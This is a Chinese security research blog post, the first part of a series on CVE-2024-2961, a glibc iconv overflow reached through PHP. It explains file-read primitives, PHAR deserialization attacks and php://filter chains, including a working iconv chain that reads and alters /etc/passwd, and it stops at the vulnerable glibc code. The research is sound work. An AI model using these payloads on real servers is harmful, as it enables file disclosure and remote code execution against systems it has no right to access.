#  ICONV，将字符集设置为 RCE：利用 GLIBC 攻击 PHP 引擎   
原创 jinyu  影域实验室   2024-05-29 17:22  
  
**免责声明：**  
  
本文所涉及的任何技术、信息或工具，仅供学习和参考之用。请勿利用本文提供的信息从事任何违法活动或不当行为。任何因使用本文所提供的信息或工具而导致的损失、后果或不良影响，均由使用者个人承担责任，与本文作者无关。作者不对任何因使用本文信息或工具而产生的损失或后果承担任何责任。使用本文所提供的信息或工具即视为同意本免责声明，并承诺遵守相关法律法规和道德规范。  
  
  
  
**介绍**  
  
几个月前，我偶然发现了 glibc  
（  
Linux   
程序的基础库）中存在一个已有   
24   
年历史的缓冲区溢出漏洞。尽管在多个知名库或可执行文件中都可以找到该漏洞，但事实证明它很少被利用   
—   
虽然它没有提供太多的回旋余地，但它需要难以实现的先决条件。寻找目标主要导致失望。然而，在   
PHP   
上，这个漏洞却大放异彩，并被证明可以通过两种不同的方式利用其引擎。  
  
由于材料数量较多，我们将分三部分介绍该漏洞的影响和利用情况。在本系列的第一部分中，我将介绍我如何遇到该漏洞，为什么合适的目标很少，最后深入研究 PHP   
引擎以演示一种新的利用方式：将文件读取原语转换为   
PHP   
应用程序中的远程代码执行。  
  
**发现：关于过滤器的故事**  
  
**PHP 中的文件读取**  
  
我们先来了解一下基础知识。假设在执行评估时，您发现了一个文件读取原语，例如：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-bottom: 6pt;text-align: left;line-height: normal;margin-top: 0px;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">SQL</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">echo</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> file_get_contents($_GET[&#39;file&#39;]);</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
  
你能用它做什么？嗯，显然是读取文件。/etc/passwd  
例如，你可以读取。但   
PHP   
还允许你使用其他协议，例如  
http://  
或  
ftp://  
。因此，你可以让   
PHP   
为你获取   
google   
首页，使用  
http://google.com  
；或者从   
FTP   
服务器下载文件，使用  
ftp://user:passwd@ftp.target.com/file.bin  
。但这还不是全部；  
PHP   
还实现了自定义协议，例如  
phar://  
。  
  
phar://  
可让您读取  
PHAR   
档案  
。PH AR   
代表PHP  
档案，就像 J AR   
代表   
Java   
档案一样。  
它是一组文件，  
例如：  
  
•   
源代码  
  
•   
资源  
  
•   
序列化元数据  
  
  
多年来，该协议一直是 PHP   
的败笔，因为当您使用它访问   
PHAR   
文件时，其元数据会被反序列化。常见的   
PHAR   
攻击如下：  
  
1.  
将 PHAR   
档案上传到目标服务器（  
PHAR   
文件非常通用，因此您可以将它们设置为看起来像图像、  
PDF   
或任何其他东西）  
  
2.  
使用文件读取原语访问 PHAR   
文件，使用  
phar:///path/to/file.phar/test  
  
3.  
任意有效载荷被反序列化  
  
将反序列化转换为代码执行可以通过多种方式完成，但人们通常依赖于 PHP   
上的反序列化工具  
PHPGGC  
。  
  
PHAR   
攻击的影响不容小觑。自   
2018   
年出现以来，  
PHAR   
攻击一直是获取   
PHP   
目标   
shell   
的关键。但这场盛宴即将结束：  
  
•  
从 PHP 8.0  
（  
2020   
年发布）开始，  
phar://  
不再反序列化元数据。（反正他们也没用元数据，那为什么要反序列化呢）。这彻底杜绝了 PHAR   
攻击。  
  
•  
大型应用程序（例如 Drupal   
或   
Magento  
）已禁用该  
phar://  
协议  
  
•  
随着时间的推移，反序列化将变得越来越难以利用：库正在修补其反序列化链，并且类型正在卷土重来，大大减少了反序列化路径。  
  
但  
phar://  
对于攻击者来说，这并不是唯一有用的协议；另一个协议也产生了很好的结果：  
php://filter  
。  
  
**PHP 过滤器简介**  
  
多年来，人们对   
产生了兴趣  
php://filter  
，这是另一个 PHP   
特定协议（如果名称没有说明这一点的话）。它提供了一种在返回流之前对其进行转换的方法。语法如下：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">php://filter/[filters...]/resource=[resource]</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
资源可以是我们在上一节中讨论过的任何内容：一个简单文件、一个 HTTP   
响应、一个来自   
FTP   
服务器的文件  
……  
  
过滤器是您希望 PHP   
在流上应用的转换列表。在这里，我们要求   
PHP   
使用过滤器将资源的内容转换为   
base64   
convert.base64-encode  
：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">php://filter/convert.base64-encode/resource=/etc/passwd</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
它返回：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYXNoCmJpbjp4OjE6MTpiaW46L2Jpbjovc2Jpbi9u</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">b2xvZ2luCmRhZW1vbjp4OjI6MjpkYWVtb246L3NiaW46L3NiaW4vbm9sb2dpbgphZG06eDozOjQ6</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">...</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">Yi92bnN0YXQ6L2Jpbi9mYWxzZQpyZWRpczp4OjEwMjoxMDM6cmVkaXM6L3Zhci9saWIvcmVkaXM6</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">L2Jpbi9mYWxzZQo=</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
您可以根据需要添加任意数量的过滤器。在这里，我要求 PHP   
对流进行两次   
base64   
编码：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/passwd</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
我得到：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">Y205dmREcDRPakE2TURweWIyOTBPaTl5YjI5ME9pOWlhVzR2WVhOb0NtSnBianA0T2pFNk1UcGlh</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">...</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">RXdNam94TURNNmNtVmthWE02TDNaaGNpOXNhV0l2Y21Wa2FYTTZMMkpwYmk5bVlXeHpaUW89</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
显然，base64   
编码并不是您唯一能做的事情。还有许多过滤器可用。它们包括：  
  
•   
string.upper  
，将字符串转换为大写  
  
•   
string.lower  
，将字符串转换为小写  
  
•   
string.rot13  
，它执行一些 BC   
加密  
  
•   
convert.iconv.X.Y  
，将字符集从   
转换  
X  
为  
Y  
  
让我们看一下最后一个过滤器：  
convert.iconv.X.Y  
。假设我需要将文件从 UTF8   
转换为   
UTF16  
。我可以使用：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">php://filter/convert.iconv.UTF-8.UTF-16/resource=/etc/passwd</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
得出的结果（十六进制形式）：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">00000000: fffe 7200 6f00 6f00 7400 3a00 7800 3a00  ..r.o.o.t.:.x.:.00000010: 3000 3a00 3000 3a00 7200 6f00 6f00 7400  0.:.0.:.r.o.o.t.                                ...00000a40: 2f00 6200 6900 6e00 2f00 6600 6100 6c00  /.b.i.n./.f.a.l.00000a50: 7300 6500 0a00                           s.e...</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
过滤器的众多性以及将它们链接起来的可能性导致了一些关于 PHP   
的出色研究，例如  
这里  
、  
这里  
或  
这里  
。实际上，使用精心挑选的过滤器（过滤器链  
），攻击者可以做一些奇妙的事情，例如  
完全更改文件的内容  
，或使用  
基于错误的 Oracle   
逐个提取其字节  
。  
  
例如，这里有一个过滤器链，其前缀  
Hello world!  
为  
/etc/passwd  
：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.IBM860.UTF16|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.JS.UNICODE|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.855.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.855.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L5.UTF-32|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.ISO2022KR.UTF16|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.855.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.855.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|</span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/etc/passwd</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
结果如下：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">Hello, world!!!root:x:0:0:root:/root:/bin/bash...</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
**PHP 过滤器：前缀、后缀和崩溃**  
  
遗憾的是，文件读取并不总是像下面这样简单：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">echo</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> file_get_contents($_POST[&#39;file&#39;]);</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
通常，文件不会按原样返回，但会以某种方式进行解析或检查。例如，我经常遇到这段代码的变体，它要求你的文件是有效的 JSON  
：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">$data = file_get_contents($_POST[&#39;url&#39;]);$data = json_decode($data);</span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">echo</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> $data-&gt;message;</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
我们在这里读取了一个文件，但随后对内容进行了 JSON   
反序列化，并且只返回了文档的一部分。为了读取标准文件（例如），  
/etc/passwd  
我们需要向流添加任意前缀  
和后缀  
。类似于：  
{"message": "<contents-of-/etc/passwd>"}  
。2023   
年末，情况是您可以使用  
php://filter  
链向流添加前缀，但不能添加后缀。所以我开始研究一种算法来执行后者*  
。  
  
当时，我对字符集或编码一无所知（说实话，我仍然不知道它们的区别）。首先，我编写了一个暴力破解脚本，将几个  
iconv  
过滤器堆叠在一起，并显示结果。类似于：  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">php://filter/convert.iconv.A.B/convert.iconv.C.D/convert.iconv.E.F/resource=data:,test123</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
在某个时候，我的  
“  
模糊测试器  
”**崩溃了**  
。  
  
由于我一生中大部分时间都在使用 PHP  
，所以我总是会指责别人。但我当时并不知道，这个错误位于调用链的底层：一直到**glibc**  
。  
  
• 注：该研究产生了一个于 2023 年 12 月发布的工具：wrapwrap。  
  
**CVE-2024-2961：glibc 中的一个错误**  
  
**API****iconv()**  
  
当 PHP   
从一个字符集转换为另一个字符集时，它会使用**iconv**  
，这是一种 API  
，用于  
“  
使用转换描述符将输入缓冲区中的字符转换为输出缓冲区  
”  
。在   
Linux   
上，此   
API   
由   
glibc  
实现  
。  
  
API   
非常简单。首先打开一个转换描述符，它指示输入和输出字符集。  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">iconv_t iconv_open(</span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">const</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> char *tocode, </span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">const</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> char *fromcode);</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
然后，您可以使用  
iconv()  
将输入缓冲区转换为输出缓冲区  
inbuf  
中的新字符集。  
outbuf  
<table><tbody><tr><td width="414" valign="top" style="padding: 3pt 6pt 1.5pt;border-width: 1pt;border-color: rgb(222, 224, 227);background: rgb(245, 246, 247);"><p style="margin-top:6.0000pt;margin-bottom:6.0000pt;text-align:left;line-height:120%;"><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;">Plaintext</span><span style="font-family:Consolas;line-height:120%;color:rgb(100,106,115);font-size:11.0000pt;"><br/></span><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;">size_t iconv(iconv_t cd,            char **</span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">restrict</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> inbuf, size_t *</span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">restrict</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> inbytesleft,            char **</span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">restrict</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> outbuf, size_t *</span><strong><span style="font-family:Consolas;line-height:120%;mso-ansi-font-weight:bold;font-size:11.0000pt;">restrict</span></strong><span style="font-family:Consolas;line-height:120%;font-size:11.0000pt;"> outbytesleft);</span><span style="font-family:Calibri;mso-fareast-font-family:宋体;mso-bidi-font-family:&#39;Times New Roman&#39;;font-size:10.5000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
缓冲区管理是调用者的责任。如果输出缓冲区不够大，  
iconv()  
将返回一个错误来表明这一点，并且您将能够重新分配  
outbuf  
并通过再次调用继续转换  
iconv()  
。该函数保证它永远不会从   
读取超过  
inbytesleft  
字节  
inbuf  
，也不会**向 写入**  
超过  
outbytesleft  
字节  
outbuf  
。永远不会？嗯，理论上  
...  
  
**转换为 ISO-2022-CN-EXT 时发生越界写入**  
  
碰巧的是，在将数据转换为  
ISO-2022-CN-EXT  
字符集时，iconv  
可能无法在写入之前检查输出缓冲区中是否有足够的空间。  
  
实际上，  
ISO-2022-CN-EXT  
它实际上是一个字符集的集合：当它需要对一个字符进行编码时，它会选择适当的字符集，并发出一个转义序列来指示解码器需要切换到这样的字符集。  
  
下面的代码是负责发出此类转义序列的部分。它由 3   
个  
if  
块组成，每个块将不同的转义序列写入  
outbuf  
（指向  
outptr  
）。如果你看第一个([1])  
，你会看到它以另一个块为前缀，  
if()  
该块检查输出缓冲区是否足够大以容纳 4   
个字符。其他两个  
if()  
 ([2][3])  
没有**。**  
因此，转义序列可能会越界写入。  
